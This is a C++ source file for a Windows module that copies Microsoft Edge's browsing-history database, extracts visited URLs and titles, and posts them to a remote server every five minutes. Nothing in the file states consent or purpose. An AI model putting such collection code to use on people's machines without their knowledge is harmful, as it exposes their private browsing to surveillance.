#include "HttpClient.h"
#include "BrowserHistory.h"
#include "Common.h"
#include "SQLiteDB.h"

#include <thread>

BrowserHistory::BrowserHistory() {}

BrowserHistory::~BrowserHistory() {
	if (db) {
		sqlite3_close(db);
	}
}

BrowserHistory& BrowserHistory::GetInstance() {
	static BrowserHistory instance;
	return instance;
}

void BrowserHistory::SetAppDataPath(std::wstring wszAppDataPath) {
	m_wszAppDataPath = wszAppDataPath;
}

std::vector<BrowserItem> BrowserHistory::GetEdgeHistory() {
    std::wstring dir = GetCurrentDir();
    std::vector<BrowserItem> results;
	BrowserHistoryDB& browserHistoryDB = BrowserHistoryDB::GetInstance();
	std::wstring tempHistoryPath = dir + TEMP_BROWSER_HISTORY_NAME;
	int64_t lastVisitTime = browserHistoryDB.getLastVisitTime("edge");
	if (m_wszAppDataPath.empty()) {
		return results;
	}

	std::wstring browser_history_path = m_wszAppDataPath + L"\\Microsoft\\Edge\\User Data\\Default\\History";
    if (!CopyFileW((LPWSTR)(browser_history_path.c_str()),
        (LPWSTR)tempHistoryPath.c_str(),
        FALSE)) {
		std::cout << "Failed to copy browser history database: " << GetLastError() << std::endl;
        return results;
    }
    
    if (db) {
        sqlite3_close(db);
    }

    if (sqlite3_open(WstringToString(tempHistoryPath).c_str(), &db) != SQLITE_OK) {
        LogToFile("Can't open database: " + WstringToString(browser_history_path));
        db = nullptr;
		return results;
    }

    const char* sql = "SELECT url, title, visit_count, typed_count, last_visit_time, hidden FROM urls WHERE last_visit_time>?";
    sqlite3_stmt* stmt;
    int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to prepare statement: " << sqlite3_errmsg(db) << std::endl;
        return results;
    }

    rc = sqlite3_bind_int64(stmt, 1, lastVisitTime);
    if (rc != SQLITE_OK) {
        std::cerr << "Failed to bind last_visit_time: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_finalize(stmt);
        return results;
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        BrowserItem item;
        const unsigned char* urlText = sqlite3_column_text(stmt, 0);
        item.url = urlText ? reinterpret_cast<const char*>(urlText) : "";

        const unsigned char* titleText = sqlite3_column_text(stmt, 1);
        item.title = titleText ? reinterpret_cast<const char*>(titleText) : "";

        item.visit_count = sqlite3_column_int(stmt, 2);

        item.typed_count = sqlite3_column_int(stmt, 3);

        item.last_visit_time = sqlite3_column_int64(stmt, 4);

        item.hidden = sqlite3_column_int(stmt, 5);

        results.push_back(item);
    }

    if (rc != SQLITE_DONE) {
        std::cerr << "Step error: " << sqlite3_errmsg(db) << std::endl;
    }

    sqlite3_finalize(stmt);

    if (db) {
        sqlite3_close(db);
    }

    return results;
}

void BrowserHistory::MonitorBrowserHistory() {
	while (WaitForSingleObject(g_StopEvent, 5 * 60 * 1000) != WAIT_OBJECT_0) {
		std::vector<BrowserItem> history = GetEdgeHistory();
		std::cout << "Fetched " << history.size() << " new history items." << std::endl;
		BrowserHistoryDB& browserHistoryDB = BrowserHistoryDB::GetInstance();
		for (const auto& item : history) {
			if (!browserHistoryDB.add(
				"edge",
				item.url,
				item.title,
				item.visit_count,
				item.typed_count,
				item.last_visit_time,
				item.hidden
			)) {
			}
		}
		
		json browserData = browserHistoryDB.query_all();
		HttpClient& httpClient = HttpClient::GetInstance();
        if (!browserData.is_null()) {
            if (httpClient.PostBrowserHistory(browserData)) {
                browserHistoryDB.update_status(browserData);
            }
        }
		std::cout << "Posted browser history to server." << std::endl;

	}
}